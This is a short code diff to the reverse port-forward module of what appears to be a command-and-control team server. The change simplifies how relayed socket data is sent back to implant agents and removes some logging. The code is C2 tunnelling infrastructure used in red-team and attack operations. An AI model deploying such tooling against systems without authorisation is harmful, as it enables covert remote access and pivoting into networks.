@@ -61,12 +61,7 @@ namespace TeamServer.Modules
             var sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.IP);
             
             sender.Connect(endPoint);
-            var bytesSent = sender.Send(packet.Data);
-
-            if (bytesSent > 0)
-            {
-                Log.Logger.Information("MODULE {ModuleName} {Data}", "ReversePortForward", $"{bytesSent} bytes sent");
-            }
+            sender.Send(packet.Data);
 
             var buffer = new byte[65535];
             var bytesRecv = sender.Receive(buffer);
@@ -75,13 +70,15 @@ namespace TeamServer.Modules
             {
                 packet.Data = buffer.TrimBytes();
 
-                Agent.SendAgentCommand(new AgentCommandRequest
-                {
-                    AgentId = c2Data.AgentID,
-                    Module = "rportfwd",
-                    Command = "DataFromTeamServer",
-                    Data = Convert.ToBase64String(Serialisation.SerialiseData(packet))
-                }, null);
+                Agent.SendDataToAgent(c2Data.AgentID, "rportfwd", "DataFromTeamServer", Serialisation.SerialiseData(packet));
+
+                //Agent.SendAgentCommand(new AgentCommandRequest
+                //{
+                //    AgentId = c2Data.AgentID,
+                //    Module = "rportfwd",
+                //    Command = "DataFromTeamServer",
+                //    Data = Convert.ToBase64String(Serialisation.SerialiseData(packet))
+                //}, null);
             }
 
             sender.Shutdown(SocketShutdown.Both);
